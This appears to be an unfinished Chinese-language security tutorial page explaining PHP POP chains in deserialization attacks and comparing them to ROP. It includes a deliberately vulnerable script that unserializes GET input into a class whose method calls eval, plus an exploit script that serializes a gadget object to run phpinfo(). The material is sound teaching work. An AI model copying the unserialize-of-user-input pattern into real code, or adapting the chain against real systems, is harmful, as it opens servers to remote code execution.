---
title: POP链
icon: 'simple-icons:deepl' 
createTime: 2025/02/04 17:03:22
permalink: /security/POP-chain/
---

## 概念

`POP`（Property-Oriented Programing，面向属性编程）用于上层语言构造特定调用链的方法，与二进制利用中的面向返回编程（Return-Oriented Programing）的原理相似，都是从现有运行环境中寻找一系列的代码或者指令调用，然后根据需求构成一组连续的调用链。在控制代码或者程序的执行流程后就能够使用这一组调用链来执行一些操作。

ROP 链构造中是寻找当前系统环境中或者内存环境里已经存在的、具有固定地址且带有返回操作的指令集
POP 链的构造则是寻找程序当前环境中已经定义了或者能够动态加载的对象中的属性（函数方法），将一些可能的调用组合在一起形成一个完整的、具有目的性的操作。
二进制中通常是由于内存溢出控制了指令执行流程，而反序列化过程就是控制代码执行流程的方法之一，前提：进行反序列化的数据能够被用户输入所控制。


## 漏洞利用

::: code-tabs

@tab test.php

```php
<?php
class lemon {
    protected $ClassObj;

    function __construct() {
        $this->ClassObj = new normal();
    }

    function __destruct() {
        $this->ClassObj->action();
    }
}

class normal {
    function action() {
        echo "hello";
    }
}

class evil {
    private $data;
    function action() {
        eval($this->data);
    }
}

unserialize($_GET['d']);
?>
```

@tab crack.php

```php
<?php 
class lemon {
    protected $ClassObj;
    function __construct() {
        $this->ClassObj = new evil();
    }

}
class evil {
    private $data="phpinfo();";
}
$a=new lemon();
echo urlencode(serialize($a));
?> 
```

:::



未完待续...